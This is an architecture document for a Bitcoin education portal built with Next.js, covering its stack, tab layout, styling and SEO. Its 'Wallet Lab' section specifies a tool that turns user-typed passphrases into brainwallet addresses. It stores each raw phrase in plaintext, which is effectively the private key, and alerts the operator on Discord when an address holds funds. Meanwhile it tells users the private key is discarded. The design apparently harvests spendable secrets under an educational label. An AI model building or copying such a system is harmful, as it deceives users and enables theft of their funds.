# QL_Portal_Architecture — QuantumBTC Onboarding Portal

> **ID:** QL_Portal_Architecture
> **Version:** 1.3
> **Last Updated:** 2026-04-17
> **Status:** APPROVED

## 1. Overview

The QuantumBTC Onboarding Portal (`learn.quantumbtc.dev`) is a **Next.js 14 (App Router)** application deployed as a static-first SSR site. Its primary purpose is educational onboarding and brand discovery.

## 2. Tech Stack

| Layer | Technology | Version |
| :--- | :--- | :--- |
| Framework | Next.js (App Router) | 14.2.3 |
| Language | TypeScript | ^5 |
| Runtime | React | ^18 |
| Styling | CSS Modules (Vanilla CSS) | N/A |
| Hosting | Vercel (inferred) | N/A |
| Fonts | Inter (Google Fonts) | Next/font |

## 3. Project Structure

```
onboarding-portal/
├── app/
│   ├── layout.tsx          ← Root layout: metadata, fonts, global CSS
│   ├── page.tsx            ← Main page: tab state (useState), renders tab panels
│   ├── globals.css         ← CSS custom properties (design tokens)
│   ├── page.module.css     ← Layout classes for the main page
│   ├── robots.ts           ← next-sitemap robots config
│   └── sitemap.ts          ← next-sitemap sitemap config
├── components/
│   ├── TabNav.tsx          ← Sticky nav: tab bar on desktop, hamburger menu on mobile
│   ├── BrandHero.tsx       ← Logo + Banner hero (Tab 1: Overview)
│   ├── Hero.tsx            ← Original hero CTA section
│   ├── Manifesto.tsx       ← "The Quantum Manifesto" card
│   ├── VisualGuide.tsx     ← L1 vs L2 visual comparison
│   ├── WalletTierList.tsx  ← Recommended LN wallets
│   ├── QuantumShielding.tsx← Quantum threat roadmap
│   └── FAQ.tsx             ← Security FAQ
├── dictionaries/
│   └── en.json             ← All UI text content (Single Source of Truth for copy)
├── public/
│   ├── favicon.png         ← QuantumBTC logo (96×96)
│   └── og-image.png        ← Open Graph banner (1200×630)
└── next.config.js          ← Redirects (/en, /es → /)
```

## 4. Tab Architecture

The page is a **6-tab SPA** driven by React `useState` in `page.tsx`. `'use client'` is required.

| Tab ID | Label | Primary Component |
| :--- | :--- | :--- |
| `overview` | Overview | `BrandHero` + `Manifesto` |
| `l1l2` | L1 / L2 | `VisualGuide` |
| `wallets` | Wallets | `WalletTierList` |
| `quantumshield` | QuantumShield | `QuantumShielding` |
| `faq` | FAQ | `FAQ` |
| `walletlab` | Wallet Lab | `WalletLab` |

## 4.1 Responsive Navigation (`TabNav`)

`TabNav` adapts its layout to screen size with a single CSS breakpoint at **768px**:

| Breakpoint | Behavior |
| :--- | :--- |
| ≥ 768px (Desktop) | Horizontal tab bar with icons + full labels. Active tab highlighted in `--primary` orange. |
| < 768px (Mobile) | Tab bar hidden. A **hamburger button (☰)** appears in the top-right corner. Tapping it reveals a vertical dropdown menu with all 5 tabs (full label + icon). Selecting a tab closes the menu automatically. |

**Hamburger animation:** The 3 bars animate into a **✕** when the menu is open, using CSS `transform: rotate()` transitions — identical to the pattern used in `quantumbtc.dev`'s `Layout.tsx`.

## 5. Design Tokens (globals.css)

| Token | Value | Usage |
| :--- | :--- | :--- |
| `--background` | `#0a0a0a` | Page background |
| `--foreground` | `#ededed` | Primary text |
| `--primary` | `#f7931a` | Bitcoin orange, CTAs, active tab |
| `--primary-hover` | `#e08210` | Hover state for primary |
| `--accent` | `#8b5cf6` | Purple gradient accent |

## 6. SSR / SEO Strategy

- All metadata is configured in `app/layout.tsx` using Next.js `Metadata` API.
- The page is server-rendered on first load (no `'use client'` at layout level).
- Tab state is client-side only — search engines index the full default tab (Overview) content.
- Canonical URL: `https://learn.quantumbtc.dev`.
- See `QL_SEO_Strategy.md` for full SEO documentation.

## 7. Wallet Lab Tab (Tab 6)

### 7.1 Overview

The **Wallet Lab** is a cryptography education tool that demonstrates how Bitcoin addresses are derived from an arbitrary passphrase using `SHA-256(phrase)` as the private key. This method is **inherently insecure** and the UI displays a prominent, non-dismissible security warning.

### 7.2 Architecture

| Concern | Where it runs | Notes |
| :--- | :--- | :--- |
| Key derivation (ECDSA) | **Server** (`/api/wallet-lab/derive`) | Private key never returned to browser |
| mempool.space queries | **Browser** | Each user consumes their own API quota |
| Phrase storage (Supabase) | **Server** (`/api/wallet-lab/record`) | Only called when TX activity detected |
| Discord alert | **Server** (`/api/wallet-lab/record`) | Fires when `balance_btc > 0` |

### 7.3 API Routes

#### `POST /api/wallet-lab/derive`
- **Runtime:** Node.js
- **Input:** `{ phrase: string }`
- **Output:** `{ pubkey_hex, p2pk_scripthash, legacy_uncomp, legacy_comp, p2sh, bech32, p2wsh, p2tr }`
- **Libraries:** `@noble/secp256k1` (ECDSA + Schnorr), `@noble/hashes`, `@scure/base` (bech32 + bech32m)
- **Security:** Private key is computed and discarded server-side. It is **never** logged or returned.

**Derived address types (7 total):**

| # | Name | Format | Algorithm |
| :--- | :--- | :--- | :--- |
| 1 | Pay-to-Public-Key (P2PK) | 130-char hex | ECDSA uncompressed pubkey |
| 2 | Pay-to-Public-Key-Hash Uncomp (P2PKH) | `1…` (33–34 chars) | hash160(uncompressed pubkey) |
| 3 | Pay-to-Public-Key-Hash Comp (P2PKH) | `1…` (33–34 chars) | hash160(compressed pubkey) |
| 4 | Pay-to-Script-Hash (P2SH) | `3…` (34 chars) | hash160(P2WPKH redeemScript) |
| 5 | Pay-to-Witness-Public-Key-Hash (P2WPKH) | `bc1q…` (42 chars) | bech32 v0, hash160(comp pubkey) |
| 6 | Pay-to-Witness-Script-Hash (P2WSH) | `bc1q…` (62 chars) | bech32 v0, sha256(1-of-1 multisig witnessScript) |
| 7 | Pay-to-Tap-Root (P2TR) | `bc1p…` (62 chars) | bech32m v1, Schnorr x-only pubkey |

#### `POST /api/wallet-lab/record`
- **Runtime:** Node.js
- **Input:** `{ phrase, phrase_hash, addresses, tx_count, total_received_btc, balance_btc }`
- **Logic:** Upserts row in `wallet_lab_phrases` (deduped by `phrase_hash`). Sends Discord alert if `balance_btc > 0`.
- **Auth:** No user auth. Service role key used server-side only.

### 7.4 Supabase Table — `wallet_lab_phrases`

| Column | Type | Purpose |
| :--- | :--- | :--- |
| `phrase_hash` | TEXT UNIQUE | SHA-256(phrase) — dedup key |
| `phrase` | TEXT | Actual phrase (educational context) |
| `addresses` | JSONB | All 7 derived address types |
| `tx_count` | INTEGER | Total TXs found |
| `total_received_btc` | NUMERIC(20,8) | Lifetime received |
| `balance_btc` | NUMERIC(20,8) | Current balance (triggers alert) |
| `alert_sent` | BOOLEAN | Prevents duplicate alerts |

### 7.5 Required Environment Variables (Vercel)

| Variable | Description |
| :--- | :--- |
| `SUPABASE_URL` | `https://pwmjzqgfkgrzfqbsxube.supabase.co` |
| `SUPABASE_SERVICE_ROLE_KEY` | From Supabase Dashboard → Settings → API |
| `ADMIN_ALERT_WEBHOOK` | Discord Webhook URL (same as backend Ruleta project) |

## 8. Deployment

- Git repository: `onboarding-portal/` subfolder within `quantum-btc-marketing/`.
- Deployments are triggered by git push to `main` branch.
- See `QL_Operations_Manual.md` for deployment procedures.
